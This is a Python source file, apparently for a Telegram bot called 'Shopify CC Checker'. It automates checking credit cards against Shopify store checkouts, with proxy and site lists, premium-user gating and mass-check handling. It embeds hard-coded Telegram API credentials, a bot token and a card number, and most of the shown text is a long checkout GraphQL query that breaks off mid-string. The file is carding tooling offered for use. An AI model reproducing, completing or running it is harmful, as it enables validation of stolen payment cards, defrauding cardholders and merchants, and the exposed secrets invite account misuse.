"""
╔══════════════════════════════════════════╗
║   SHOPIFY CC CHECKER — @Onyxa_a       ║
║   Complete professional rewrite          ║
╚══════════════════════════════════════════╝
"""

import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import html
import base64
from urllib.parse import urlparse
from datetime import datetime
from telethon import TelegramClient, events, Button

# ══════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════
API_ID    = 31674738
API_HASH  = '94f8f29e620248ca07030e458905b1c6'
BOT_TOKEN = '8834617437:AAGk0561cVa0waICW1nStUFgfa6gS4AwKoc'
ADMIN_IDS = [8744777152, 8744777152, 8744777152]

PREMIUM_FILE  = 'premium.txt'
SITES_FILE    = 'sites.txt'
PROXY_FILE    = 'proxies.txt'
WELCOME_IMAGE = 'banner.jpg'

# Timeouts (seconds)
CARD_TIMEOUT  = 60   # hard kill per card check attempt (process_card needs 35-55s)
PROXY_TIMEOUT = 15   # per proxy test
SITE_TIMEOUT  = 22   # per site test

# Fixed card used to test sites (dead card — only infrastructure response matters)
SITE_TEST_CARD = "4165983486766199|12|2028|474"
SITE_META_FILE = "sites_meta.json"

# Auto-remove site after this many total errors during mass check
SITE_ERROR_THRESHOLD = 1

# ══════════════════════════════════════════
#  PREMIUM EMOJI IDS
# ══════════════════════════════════════════
PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "5444931419270839381", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5364052602357044385", "⭐": "5343636681473935403",
    "🆓": "5406756500108501710", "👑": "5303547611351902889", "🔍": "5258396243666681152",
    "⏱️": "5303243514782443814", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5303159080020372094", "🥰": "5881784744949062058", "😱": "5868517294618975202",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5116599934203724812", "🌳": "5305346287820895195",
    "🦉": "5123344136665039833", "🍑": "5258121851091043775", "💪": "5305622454218024328",
    "🌝": "5404494035891023578", "📁": "5447408120752013199", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5283232570660634549",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5305618829265628111",
    "📌": "5447187153274567373", "💸": "5447579253723918909",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
    "🎯": "5445284056535558176", "💫": "5443038326535759928", "🎊": "5445251564065713729",
    "🔒": "5258476306152038031",
}
_PE = PREMIUM_EMOJI_IDS

def pe(text: str) -> str:
    """Wrap emoji in Telegram premium animated sticker tags."""
    if not text:
        return text
    for emoji, eid in _PE.items():
        text = text.replace(emoji, f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>')
    return text

premium_emoji = pe  # alias

def esc(v) -> str:
    return html.escape(str(v))

def _fmt_card(card: str) -> str:
    """Returns card in original num|mm|yyyy|cvv format."""
    return card  # Keep original pipe format as-is

def load_site_meta() -> dict:
    """Load stored site metadata (gateway, price, response)."""
    try:
        if os.path.exists(SITE_META_FILE):
            with open(SITE_META_FILE, 'r') as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def save_site_meta(meta: dict):
    """Persist site metadata."""
    try:
        with open(SITE_META_FILE, 'w') as f:
            json.dump(meta, f, indent=2)
    except Exception:
        pass

def update_site_meta(results_list: list):
    """Upsert gateway/price/response for each site result."""
    meta = load_site_meta()
    for r in results_list:
        site = r.get('site', '')
        if site:
            meta[site] = {
                'gateway':  r.get('gateway', '-'),
                'price':    r.get('price', '-'),
                'response': r.get('response', r.get('message', '-'))[:80],
                'checked':  datetime.now().strftime('%d/%m/%Y'),
            }
    save_site_meta(meta)

def make_bar(current: int, total: int, width: int = 12) -> str:
    filled = int(width * current / max(total, 1))
    return '▰' * filled + '▱' * (width - filled)

SEP = "━━━━━━━━━━━━━━━━━━━━━━━"

active_sessions: dict = {}
_recheck_store: dict = {}   # Stores errored cards for recheck (used by final results)


# ══════════════════════════════════════════
#  SHOPIFY ENGINE  (merged from main.py — no external API needed)
# ══════════════════════════════════════════

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode 